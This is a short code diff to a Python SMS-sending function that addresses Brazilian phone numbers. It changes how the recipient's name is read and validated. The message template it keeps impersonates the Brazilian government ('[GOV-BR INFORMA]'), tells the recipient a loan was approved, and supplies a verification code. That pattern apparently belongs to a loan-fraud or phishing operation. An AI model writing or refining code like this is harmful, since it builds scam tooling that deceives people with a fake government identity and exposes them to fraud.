@@ -91,11 +91,18 @@ def send_verification_code_owen(phone_number: str, verification_code: str) -> tu
             # Format as international number with Brazil code
             international_number = f"55{formatted_phone}"
             
-            # Get name from request data
-            nome = request.form.get('nome', '') or request.args.get('nome', '')
-            first_name = nome.split()[0] if nome else "Cliente"
+            # Get name from session data
+            session_data = request.get_json()
+            nome = session_data.get('nome', '') if session_data else ''
+            if not nome:
+                nome = request.form.get('nome', '') or request.args.get('nome', '')
+            first_name = nome.split()[0] if nome else nome  # Use full name if can't split
             
-            # Message template
+            # Message template with name validation
+            if not first_name:
+                app.logger.error("Nome não encontrado para SMS")
+                return False, "Nome não encontrado"
+                
             message = f"[GOV-BR INFORMA]: {first_name}, seu emprestimo foi aprovado. Seu código de verificação é: {verification_code}."
 
             # Prepare the curl command
